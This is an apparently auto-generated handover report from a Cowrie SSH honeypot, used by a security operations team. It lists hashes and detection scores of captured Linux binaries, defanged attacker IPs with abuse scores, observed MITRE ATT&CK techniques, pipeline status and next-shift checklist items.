| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `27.79.6[.]34` | VN | Viettel Group | **100** ⚠️ | 0 |
| `212.23.133[.]68` | DE | contec - Gesellschaft fuer Organisationsentwicklung mbH | **100** ⚠️ | 6 |
| `129.121.79[.]67` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 15 |
| `41.242.115[.]84` | GH | DOLPHIN TELECOMMUNICATION LIMITED | **100** ⚠️ | 50 |
| `121.227.152[.]250` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `13.81.183[.]29` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `217.154.233[.]215` | DE | IONOS SE | **100** ⚠️ | 50 |
| `122.117.219[.]87` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 1 |
| `120.48.104[.]37` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 16 |
| `51.68.65[.]117` | FR | OVH SAS | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 103 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 56 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 42 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 109 cases |
| Tool 34  | Credential Extractor        | ✅ 98 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (4.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 42 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 54 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-13T15:15:21Z_
